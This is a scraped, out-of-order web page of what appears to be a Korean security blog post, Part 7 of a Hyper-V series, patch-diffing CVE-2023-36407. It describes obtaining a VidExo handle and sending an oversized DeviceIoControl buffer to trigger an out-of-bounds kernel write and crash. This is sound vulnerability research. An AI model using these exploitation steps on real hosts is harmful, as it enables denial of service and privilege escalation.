&lt;p&gt;&amp;#xADF8;&amp;#xB7FC; Prtn &amp;#xD0C0;&amp;#xC785;&amp;#xC758; &amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; &amp;#xD578;&amp;#xB4E4;&amp;#xC740; &amp;#xC5B4;&amp;#xB5BB;&amp;#xAC8C; &amp;#xC5BB;&amp;#xC744; &amp;#xC218; &amp;#xC788;&amp;#xC744;&amp;#xAE4C;&amp;#xC694;?&lt;/p&gt;
&lt;p&gt;&amp;#xBA3C;&amp;#xC800; &amp;#xC544;&amp;#xB798;&amp;#xC758; WHVP API&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xC5EC; &amp;#xAC00;&amp;#xC0C1;&amp;#xBA38;&amp;#xC2E0;&amp;#xC744; &amp;#xAD6C;&amp;#xB3D9;&amp;#xD558;&amp;#xB294; qemu &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xC758; &amp;#xD578;&amp;#xB4E4; &amp;#xBAA9;&amp;#xB85D;&amp;#xC744; &amp;#xBCF4;&amp;#xBA74; &lt;code&gt;\Device\VidExo&lt;/code&gt;&amp;#xC758; &amp;#xD578;&amp;#xB4E4;&amp;#xC774; &amp;#xB450; &amp;#xAC1C; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/12/pwndorei/newjeans-hyper-v-pt7/image8.png&#34; alt=&#34;image8.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xB4E4;&amp;#xC740; &amp;#xAC01;&amp;#xAC01; &lt;code&gt;Exo&lt;/code&gt;, &lt;code&gt;Prtn&lt;/code&gt; &amp;#xD0C0;&amp;#xC785;&amp;#xC758; &lt;code&gt;VidExo&lt;/code&gt; &amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; &amp;#xD578;&amp;#xB4E4;&amp;#xC774;&amp;#xACE0; &amp;#xBD84;&amp;#xC11D;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &lt;code&gt;WHvSetupPartition&lt;/code&gt; &amp;#xD568;&amp;#xC218; &amp;#xD638;&amp;#xCD9C;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &lt;code&gt;Prtn&lt;/code&gt; &amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8; &amp;#xD578;&amp;#xB4E4;&amp;#xC774; &amp;#xC5BB;&amp;#xC5B4;&amp;#xC9C0;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC5EC;&amp;#xAE30;&amp;#xC11C; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294; &lt;code&gt;CreateFileW&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xC758; &amp;#xC778;&amp;#xC790;&amp;#xB85C;&amp;#xB294; &lt;code&gt;\\?\VidExo\&lt;/code&gt;&amp;#xC5D0; &amp;#xD30C;&amp;#xD2F0;&amp;#xC158;&amp;#xC758; GUID&amp;#xB85C; &amp;#xBCF4;&amp;#xC774;&amp;#xB294; &amp;#xBB38;&amp;#xC790;&amp;#xC5F4;&amp;#xC774; &amp;#xCD94;&amp;#xAC00;&amp;#xB418;&amp;#xC5B4; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB418;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/12/pwndorei/newjeans-hyper-v-pt7/image9.png&#34; alt=&#34;image9.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xBC18;&amp;#xD658;&amp;#xB41C; &amp;#xD578;&amp;#xB4E4;&amp;#xC740; 1&amp;#xACFC; OR&amp;#xB418;&amp;#xC5B4; &lt;code&gt;WHvSetupPartition&lt;/code&gt;&amp;#xD568;&amp;#xC218; &amp;#xD638;&amp;#xCD9C;&amp;#xC758; &amp;#xCCAB; &amp;#xBC88;&amp;#xC9F8; &amp;#xC778;&amp;#xC790;&amp;#xB85C; &amp;#xC804;&amp;#xB2EC;&amp;#xD55C; &amp;#xD30C;&amp;#xD2F0;&amp;#xC158; &amp;#xD578;&amp;#xB4E4;(&lt;code&gt;WHV_PARTITION_HANDLE&lt;/code&gt;) + 8&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xB418;&amp;#xACE0; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787; &amp;#xCF54;&amp;#xB4DC;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xC77D;&amp;#xC5B4; &amp;#xD578;&amp;#xB4E4;&amp;#xC744; &amp;#xAC00;&amp;#xC838;&amp;#xC635;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;HANDLE VidExo = (HANDLE)(*((__int64*)prtn + &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;) &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0xfffffffffffffffe&lt;/span&gt;);&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC774;&amp;#xD6C4; &amp;#xAC00;&amp;#xC838;&amp;#xC628; &amp;#xD578;&amp;#xB4E4;&amp;#xC744; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xC5EC; OOB Read/Write&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xB294; &amp;#xBC84;&amp;#xD37C;(0x1000)&amp;#xBCF4;&amp;#xB2E4; &amp;#xB9E4;&amp;#xC6B0; &amp;#xD070; &amp;#xD06C;&amp;#xAE30;(0x10000)&amp;#xB97C; &amp;#xAC00;&amp;#xC9C0;&amp;#xB294; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; input&amp;#xC73C;&amp;#xB85C; &lt;code&gt;DeviceIoControl&lt;/code&gt;&amp;#xC744; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC73C;&amp;#xB85C; OOB Write&amp;#xB97C; &amp;#xD2B8;&amp;#xB9AC;&amp;#xAC70;&amp;#xD558;&amp;#xACE0; &amp;#xCEE4;&amp;#xB110; &amp;#xD06C;&amp;#xB798;&amp;#xC2DC;&amp;#xB97C; &amp;#xBC1C;&amp;#xC0DD;&amp;#xC2DC;&amp;#xD0B5;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
&lt;p&gt;PoC&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD574;&amp;#xBCF4;&amp;#xBA74; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &amp;#xBE14;&amp;#xB8E8;&amp;#xC2A4;&amp;#xD06C;&amp;#xB9B0;&amp;#xC774; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xBCFC; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;!.&lt;/p&gt;
&lt;iframe width=&#34;560&#34; height=&#34;315&#34; src=&#34;https://www.youtube.com/embed/O7LLnyv1Pas?si=31L-nncsQa95NOYo&#34; title=&#34;YouTube video player&#34; frameborder=&#34;0&#34; allow=&#34;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&#34; referrerpolicy=&#34;strict-origin-when-cross-origin&#34; allowfullscreen&gt;&lt;/iframe&gt;


&lt;h1 id=&#34;The-End&#34;&gt;&lt;a href=&#34;#The-End&#34; class=&#34;headerlink&#34; title=&#34;The End&#34;&gt;&lt;/a&gt;The End&lt;/h1&gt;&lt;p&gt;&amp;#xC774;&amp;#xBC88; &amp;#xD30C;&amp;#xD2B8; 7&amp;#xC744; &amp;#xB05D;&amp;#xC73C;&amp;#xB85C; &amp;#xC800;&amp;#xC758; &amp;#xCCAB; &amp;#xC5F0;&amp;#xAD6C;&amp;#xAE00; &amp;#xC2DC;&amp;#xB9AC;&amp;#xC988;&amp;#xAC00; &amp;#xB05D;&amp;#xC774; &amp;#xB0AC;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&amp;#x2026; &amp;#xD30C;&amp;#xD2B8; 5&amp;#xAE4C;&amp;#xC9C0; &amp;#xB2E4;&amp;#xB8EC; CVE-2018-0959&amp;#xC758; &amp;#xBD84;&amp;#xC11D;&amp;#xACFC; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xC774; &amp;#xB05D;&amp;#xB09C; &amp;#xC2DC;&amp;#xC810;&amp;#xC5D0;&amp;#xC11C; Hyper-V &amp;#xCDE8;&amp;#xC57D;&amp;#xC810; &amp;#xC5F0;&amp;#xAD6C;&amp;#xB294; &amp;#xB354;&amp;#xC774;&amp;#xC0C1; &amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xC744; &amp;#xC904;&amp;#xB85C;&amp;#xB9CC; &amp;#xC54C;&amp;#xC558;&amp;#xC73C;&amp;#xB098; &amp;#xC57D;&amp;#xAC04;&amp;#xC758; &amp;#xBBF8;&amp;#xB828;&amp;#xC774; &amp;#xB0A8;&amp;#xC544; diffing &amp;#xD574;&amp;#xBCF8; 1-day&amp;#xAC00; &amp;#xC5B4;&amp;#xCC0C;&amp;#xC800;&amp;#xCC0C; &amp;#xB8E8;&amp;#xD2B8; &amp;#xCEE4;&amp;#xC988; &amp;#xBD84;&amp;#xC11D;&amp;#xACFC; LPE&amp;#xB294; &amp;#xC544;&amp;#xB2C8;&amp;#xC9C0;&amp;#xB9CC; PoC&amp;#xAE4C;&amp;#xC9C0; &amp;#xC791;&amp;#xC131;&amp;#xD558;&amp;#xB294; &amp;#xAE30;&amp;#xC5FC;&amp;#xC744; &amp;#xD1A0;&amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&amp;#x2026; &amp;#xC5EC;&amp;#xAE30;&amp;#xAE4C;&amp;#xC9C0; &amp;#xC628; &amp;#xC774;&amp;#xC0C1; &amp;#xC9C4;&amp;#xC9DC;&amp;#xB85C; Hyper-V&amp;#xB97C; &amp;#xB193;&amp;#xC544;&amp;#xC904; &amp;#xC218; &amp;#xC5C6;&amp;#xAC8C; &amp;#xB418;&amp;#xC5C8;&amp;#xB124;&amp;#xC694; &lt;/p&gt;
&lt;p&gt;&amp;#xC7A0;&amp;#xAE50; &amp;#xC9C0;&amp;#xB09C; &amp;#xB0A0;&amp;#xB4E4;&amp;#xC758; &amp;#xCD94;&amp;#xC5B5;&amp;#xC744; &amp;#xB5A0;&amp;#xC62C;&amp;#xB824; &amp;#xBD24;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&amp;#xB9CC; &amp;#xACB0;&amp;#xB860;&amp;#xC801;&amp;#xC73C;&amp;#xB85C;&amp;#xB294; NewJeans&amp;#x2019; Hyper-V &amp;#xC5F0;&amp;#xAD6C;&amp;#xAE00; &amp;#xC2DC;&amp;#xB9AC;&amp;#xC988;&amp;#xB294; &amp;#xB354;&amp;#xC774;&amp;#xC0C1; &amp;#xB04C;&amp;#xACE0;&amp;#xAC00;&amp;#xBA74; &amp;#xB108;&amp;#xBB34; &amp;#xB8E8;&amp;#xC988;&amp;#xD574;&amp;#xC9C0;&amp;#xB294; &amp;#xAC83; &amp;#xAC19;&amp;#xC544;&amp;#xC11C; &amp;#xB05D;&amp;#xB098;&amp;#xC9C0;&amp;#xB9CC; &amp;#xC800;&amp;#xC758; Hyper-V &amp;#xC0AC;&amp;#xB791;&amp;#xC740; &amp;#xC544;&amp;#xC9C1; &amp;#xC2DD;&amp;#xC9C0; &amp;#xC54A;&amp;#xC558;&amp;#xB2E4;&amp;#xB294; &amp;#xAC83;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4; &amp;gt;_-&lt;/p&gt;
&lt;p&gt;&amp;#xC544;&amp;#xBB34;&amp;#xD2BC; &amp;#xAE34; &amp;#xC2DC;&amp;#xB9AC;&amp;#xC988; &amp;#xC77D;&amp;#xC5B4;&amp;#xC8FC;&amp;#xC154;&amp;#xC11C; &amp;#xAC10;&amp;#xC0AC;&amp;#xD558;&amp;#xACE0; &amp;#xB2E4;&amp;#xC74C;&amp;#xC5D0; &amp;#xB354; &amp;#xC7AC;&amp;#xBBF8;&amp;#xC788;&amp;#xB294; &amp;#xC8FC;&amp;#xC81C;&amp;#xB85C; &amp;#xB3CC;&amp;#xC544;&amp;#xC624;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;! ^^7&lt;/p&gt;
&lt;h1 id=&#34;Reference&#34;&gt;&lt;a href=&#34;#Reference&#34; class=&#34;headerlink&#34; title=&#34;Reference&#34;&gt;&lt;/a&gt;Reference&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://hvinternals.blogspot.com/2020/06/hyper-v-memory-internals-exo-partition.html&#34;&gt;Hyper-V memory internals. EXO partition memory access&lt;/a&gt; by &lt;a href=&#34;https://twitter.com/gerhart_x&#34;&gt;Gerhart&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
 - hack &amp; life">
  <meta name="author" content="j0dev, y2sman">
  <meta name="keywords" content>
  <meta name="google-site-verification" content="DXkyiaX95-ws53Tyt0m91_umRf4gfV2qJIQZ5zQDIO4">
  <meta name="naver-site-verification" content="0b4fea742ed293b82621684e466d9f26c3ccee06">


  <meta property="og:type" content="website"> 
  <meta property="og:title" content="[Research] NewJeans Hyper-V Part 7 - CVE-2023-36407 Analysis &amp; Exploitation - hackyboiz">
  <meta property="og:description" content="&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;! &amp;#xBB34;&amp;#xB824; Part 7&amp;#xB85C; &amp;#xB3CC;&amp;#xC544;&amp;#xC628; pwndorei&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
&lt;p&gt;&amp;#xC9C0;&amp;#xB09C; Part 6&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; Hyper-V &amp;#xD328;&amp;#xCE58; &amp;#xC790;&amp;#xB3D9;&amp;#xD654; &amp;#xC2A4;&amp;#xD06C;&amp;#xB9BD;&amp;#xD2B8;&amp;#xC778; &lt;a href=&#34;https://github.com/pwndorei/Patch-V&#34;&gt;Patch-V&lt;/a&gt;&amp;#xB97C; &amp;#xC18C;&amp;#xAC1C;&amp;#xD558;&amp;#xACE0; &amp;#xAC04;&amp;#xB2E8;&amp;#xD55C; &amp;#xC608;&amp;#xC2DC;&amp;#xB85C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xBC29;&amp;#xBC95;&amp;#xC744; &amp;#xC54C;&amp;#xB824;&amp;#xB4DC;&amp;#xB838;&amp;#xC5C8;&amp;#xC8E0;? &amp;#xC774;&amp;#xBC88;&amp;#xC5D0;&amp;#xB294; Patch-V&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD574;&amp;#xC11C; Hyper-V LPE &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC778; CVE-2023-36407&amp;#xC744; Patch Diffiing&amp;#xD558;&amp;#xACE0; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC744; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787; &amp;#xD574;&amp;#xBD05;&amp;#xC2DC;&amp;#xB2E4;!&lt;/p&gt;
&lt;h1 id=&#34;Patch&#34;&gt;&lt;a href=&#34;#Patch&#34; class=&#34;headerlink&#34; title=&#34;Patch&#34;&gt;&lt;/a&gt;Patch&lt;/h1&gt;&lt;hr&gt;
&lt;p&gt;Part 6&amp;#xC5D0;&amp;#xC11C; CVE-2024-20699&amp;#xC640; CVE-2024-20700&amp;#xB97C; &amp;#xBD84;&amp;#xC11D;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD574; KB5034121&amp;#xC640; KB5033369&amp;#xB97C; Diffing&amp;#xD55C; &amp;#xAC83;&amp;#xCC98;&amp;#xB7FC; &amp;#xC774;&amp;#xBC88;&amp;#xC5D0;&amp;#xB294; KB5031354&amp;#xACFC; KB5032190&amp;#xC744; Diffing&amp;#xD574;&amp;#xBCF4;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;Windows 11 22H2(x64)&amp;#xAE30;&amp;#xC900; KB5032190&amp;#xB85C; &amp;#xD328;&amp;#xCE58;&amp;#xB41C; Hyper-V &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC740; Information Disclosure &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC778; CVE-2023-36406&amp;#xACFC; Elevation of Privilege &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC778; CVE-2023-36407, CVE-2023-36408&amp;#xC774; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;Patch-V&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xC5EC; &amp;#xC5BB;&amp;#xC5B4;&amp;#xC9C4; &amp;#xAC01; &amp;#xBC84;&amp;#xC804;&amp;#xC758; &amp;#xBC14;&amp;#xC774;&amp;#xB108;&amp;#xB9AC;&amp;#xB4E4;&amp;#xC744; &amp;#xB514;&amp;#xD551;&amp;#xD55C; BinDiff &amp;#xC6CC;&amp;#xD06C;&amp;#xC2A4;&amp;#xD398;&amp;#xC774;&amp;#xC2A4;&amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/12/pwndorei/newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image0.png&#34; alt=&#34;newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image0.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xBCC0;&amp;#xACBD;&amp;#xC810;&amp;#xC774; &amp;#xAF64;&amp;#xB098; &amp;#xB9CE;&amp;#xC744; &amp;#xAC83;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB294;&amp;#xB370;&amp;#xC694;? &amp;#xAC01; &amp;#xBC14;&amp;#xC774;&amp;#xB108;&amp;#xB9AC; &amp;#xBCC4;&amp;#xB85C; &amp;#xBC14;&amp;#xB010; &amp;#xC810;&amp;#xC774; &amp;#xC788;&amp;#xB294;&amp;#xC9C0; &amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &amp;#xC5B4;&amp;#xB5A4; &amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xC5B4;&amp;#xB5BB;&amp;#xAC8C; &amp;#xBC14;&amp;#xB00C;&amp;#xC5C8;&amp;#xB294;&amp;#xC9C0; &amp;#xC804;&amp;#xBD80; &amp;#xC0B4;&amp;#xD3B4;&amp;#xBCF4;&amp;#xB294; &amp;#xAC83;&amp;#xB3C4; &amp;#xBB34;&amp;#xB9AC;&amp;#xB294; &amp;#xC544;&amp;#xB2C8;&amp;#xC9C0;&amp;#xB9CC; &amp;#xC2DC;&amp;#xAC04;&amp;#xC774; &amp;#xB108;&amp;#xBB34; &amp;#xC624;&amp;#xB798; &amp;#xAC78;&amp;#xB9B4; &amp;#xAC81;&amp;#xB2C8;&amp;#xB2E4;&amp;#x2026;&lt;/p&gt;
&lt;p&gt;&amp;#xB530;&amp;#xB77C;&amp;#xC11C; &amp;#xC800;&amp;#xB294; &amp;#xACF5;&amp;#xAC1C;&amp;#xB41C; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC758; &amp;#xC815;&amp;#xBCF4;&amp;#xB97C; &amp;#xCD5C;&amp;#xB300;&amp;#xD55C; &amp;#xD65C;&amp;#xC6A9;&amp;#xD574;&amp;#xC11C; &amp;#xCDE8;&amp;#xC57D;&amp;#xD560; &amp;#xAC00;&amp;#xB2A5;&amp;#xC131;&amp;#xC774; &amp;#xB192;&amp;#xC740; &amp;#xBC14;&amp;#xC774;&amp;#xB108;&amp;#xB9AC;&amp;#xB4E4; &amp;#xBA3C;&amp;#xC800; &amp;#xC0B4;&amp;#xD3B4;&amp;#xBCF4;&amp;#xAE30;&amp;#xB85C; &amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
&lt;p&gt;&amp;#xBA3C;&amp;#xC800; CVE-2023-36407&amp;#xACFC; CVE-2023-36408 &amp;#xBAA8;&amp;#xB450; &amp;#xAD8C;&amp;#xD55C; &amp;#xC0C1;&amp;#xC2B9;&amp;#xACFC; &amp;#xAD00;&amp;#xB828;&amp;#xB41C; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC774;&amp;#xAE30;&amp;#xC5D0; &amp;#xBA3C;&amp;#xC800; &lt;code&gt;.sys&lt;/code&gt; &amp;#xD30C;&amp;#xC77C;&amp;#xB4E4;&amp;#xBD80;&amp;#xD130; &amp;#xC0B4;&amp;#xD3B4;&amp;#xBCF4;&amp;#xBA74; &amp;#xC88B;&amp;#xC744; &amp;#xAC83; &amp;#xAC19;&amp;#xC8E0;? &amp;#xD2B9;&amp;#xD788; &lt;a href=&#34;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36407&#34;&gt;MSRC&lt;/a&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB294; &amp;#xD574;&amp;#xB2F9; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; FAQ&amp;#xB97C; &amp;#xBCF4;&amp;#xBA74; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &amp;#xC801;&amp;#xD600;&amp;#xC788;&amp;#xB294;&amp;#xB370;&amp;#xC694;?&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs http&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Q&lt;/span&gt;: What privileges could be gained by an attacker who successfully exploited this vulnerability?

&lt;span class=&#34;hljs-attribute&#34;&gt;A&lt;/span&gt;: An attacker who successfully exploited this vulnerability could gain SYSTEM privileges.&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC744; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xD558;&amp;#xBA74; &lt;code&gt;SYSTEM&lt;/code&gt; &amp;#xAD8C;&amp;#xD55C;&amp;#xC744; &amp;#xD68D;&amp;#xB4DD;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB2E4;&amp;#xB77C;&amp;#x2026; Root Partition&amp;#xC5D0;&amp;#xC11C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB418;&amp;#xB294; &amp;#xCEE4;&amp;#xB110; &amp;#xB4DC;&amp;#xB77C;&amp;#xC774;&amp;#xBC84;&amp;#xB4E4;&amp;#xC744; &amp;#xC704;&amp;#xC8FC;&amp;#xB85C; &amp;#xC0B4;&amp;#xD3B4;&amp;#xBCF4;&amp;#xBA74; &amp;#xB420; &amp;#xAC83; &amp;#xAC19;&amp;#xB124;&amp;#xC694;!&lt;/p&gt;
&lt;h1 id=&#34;Diffing&#34;&gt;&lt;a href=&#34;#Diffing&#34; class=&#34;headerlink&#34; title=&#34;Diffing&#34;&gt;&lt;/a&gt;Diffing&lt;/h1&gt;&lt;hr&gt;
&lt;p&gt;&lt;code&gt;.sys&lt;/code&gt;&amp;#xD30C;&amp;#xC77C;&amp;#xB4E4;&amp;#xC744; &amp;#xC9D1;&amp;#xC911;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &amp;#xC0B4;&amp;#xD3B4;&amp;#xBCF8; &amp;#xACB0;&amp;#xACFC;, &lt;code&gt;winhvr.sys&lt;/code&gt;&amp;#xC758; &lt;code&gt;WinHvGetVpState&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xC640; &lt;code&gt;WinHvSetVpState&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xD06C;&amp;#xAC8C; &amp;#xBC14;&amp;#xB00C;&amp;#xC5C8;&amp;#xACE0; &lt;code&gt;WinHvpSetupVpStatePfnBuffer&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xC0AD;&amp;#xC81C;&amp;#xB41C; &amp;#xAC83;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/12/pwndorei/newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image1.png&#34; alt=&#34;newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image1.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/12/pwndorei/newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image2.png&#34; alt=&#34;newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image2.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC544;&amp;#xB798;&amp;#xB97C; &amp;#xBCF4;&amp;#xC2DC;&amp;#xBA74; &amp;#xD328;&amp;#xCE58; &amp;#xC774;&amp;#xD6C4;&amp;#xB85C; &amp;#xC5EC;&amp;#xB7EC; Basic Block&amp;#xC774; &amp;#xCD94;&amp;#xAC00;&amp;#xB41C; &amp;#xAC83;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&amp;#x2026; &amp;#xC5B4;&amp;#xB5A4; &amp;#xAC12;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; &amp;#xAC80;&amp;#xC0AC;&amp;#xAC00; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC9C0;&amp;#xC9C0; &amp;#xC54A;&amp;#xC544; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC774; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD588;&amp;#xACE0; &amp;#xD328;&amp;#xCE58;&amp;#xB294; &amp;#xD574;&amp;#xB2F9; &amp;#xAC12;&amp;#xC744; &amp;#xAC80;&amp;#xC0AC;&amp;#xD558;&amp;#xB294; &amp;#xBC29;&amp;#xD5A5;&amp;#xC73C;&amp;#xB85C; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC9C4; &amp;#xAC78;&amp;#xAE4C;&amp;#xC694;?&amp;#x2026;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/12/pwndorei/newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image3.png&#34; alt=&#34;newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image3.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xB514;&amp;#xCEF4;&amp;#xD30C;&amp;#xC77C;&amp;#xB41C; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xBE44;&amp;#xAD50;&amp;#xD55C; &amp;#xACB0;&amp;#xACFC;&amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/12/pwndorei/newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image4.png&#34; alt=&#34;newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image4.png&#34;&gt;&lt;/p&gt;
